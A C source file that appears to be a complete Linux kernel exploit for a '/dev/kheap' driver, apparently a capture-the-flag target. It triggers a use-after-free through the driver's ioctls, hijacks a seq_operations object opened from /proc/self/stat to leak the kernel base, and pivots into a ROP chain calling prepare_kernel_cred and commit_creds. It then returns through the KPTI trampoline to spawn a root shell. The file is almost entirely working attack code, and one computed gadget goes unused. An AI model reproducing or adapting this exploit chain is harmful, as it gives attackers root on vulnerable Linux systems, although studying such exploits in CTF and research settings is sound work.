
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <signal.h>
#include <unistd.h>
#include <syscall.h>
#include <pthread.h>
#include <poll.h>
#include <linux/userfaultfd.h>
#include <linux/fs.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define PAGE_SIZE 0x1000

struct info
{
  uint64_t idx;
  char *ptr;
};


int dev_fd;
uint64_t user_cs,user_ss,user_eflag,user_rsp;

void save_state()
{
  asm(
    "movq %%cs, %0;"
    "movq %%ss, %1;"
    "movq %%rsp, %3;"
    "pushfq;"
    "pop %2;"
    : "=r"(user_cs),"=r"(user_ss),"=r"(user_eflag),"=r"(user_rsp)
    :
    : "memory"
  );
}

void new(uint64_t idx)
{
  struct info arg={idx,NULL};
  ioctl(dev_fd,0x10000,&arg);
}

void delete(uint64_t idx)
{
  struct info arg={idx,NULL};
  ioctl(dev_fd,0x10001,&arg);
}

void choose(uint64_t idx)
{
  struct info arg={idx,NULL};
  ioctl(dev_fd,0x10002,&arg);
}

int seq_open()
{
  int seq;
  if ((seq=open("/proc/self/stat",O_RDONLY))==-1)
  {
    puts("[X] Seq Open Error");
    exit(0);
  }
  return seq;
}

void get_shell()
{
  system("/bin/sh");
  exit(0);
}

int main()
{
  save_state();
  dev_fd=open("/dev/kheap",O_RDWR);
  if (dev_fd<0)
  {
    puts("[X] Device Open Error");
    exit(0);
  }
  

  uint64_t *buf=malloc(0x20); uint64_t *recv=malloc(0x20);
  
  new(0);
  choose(0);
  delete(0);
  
  int seq_fd=seq_open();
  
  read(dev_fd,(char *)recv,0x20);
  
  uint64_t kernel_base=recv[0]-0x33F980;
  uint64_t prepare_kernel_cred=kernel_base+0xcebf0;
  uint64_t commit_creds=kernel_base+0xce710;
  uint64_t kpti_trampoline=kernel_base+0xc00fb0;
  uint64_t seq_read=kernel_base+0x340560;
  uint64_t pop_rdi=kernel_base+0x2517a;
  uint64_t mov_rdi_rax=kernel_base+0x5982f4;
  uint64_t gadget=kernel_base+0x94a10;
  
  printf("[+] kernel_base: 0x%lx\n",kernel_base);
  printf("[+] prepare_kernel_cred: 0x%lx\n",prepare_kernel_cred);
  printf("[+] commit_creds: 0x%lx\n",commit_creds);
  printf("[+] gadget: 0x%lx\n",gadget);
  
  uint64_t *mmap_addr=mmap((void *)(gadget&0xFFFFF000),PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_SHARED,-1,0);
  printf("[+] mmap_addr: 0x%lx\n",(uint64_t)mmap_addr);
  
  uint64_t *ROP=(uint64_t *)(((char *)mmap_addr)+0xa10),i=0;
  *(ROP+i++)=pop_rdi;
  *(ROP+i++)=0;
  *(ROP+i++)=prepare_kernel_cred;
  *(ROP+i++)=commit_creds;
  *(ROP+i++)=kpti_trampoline+22;
  *(ROP+i++)=0;
  *(ROP+i++)=0;
  *(ROP+i++)=(uint64_t)get_shell;
  *(ROP+i++)=user_cs;
  *(ROP+i++)=user_eflag;
  *(ROP+i++)=user_rsp;
  *(ROP+i++)=user_ss;
  
  memcpy(buf,recv,0x20);
  buf[0]=(uint64_t)gadget;
  write(dev_fd,(char *)buf,0x20);
  read(seq_fd,NULL,1);

}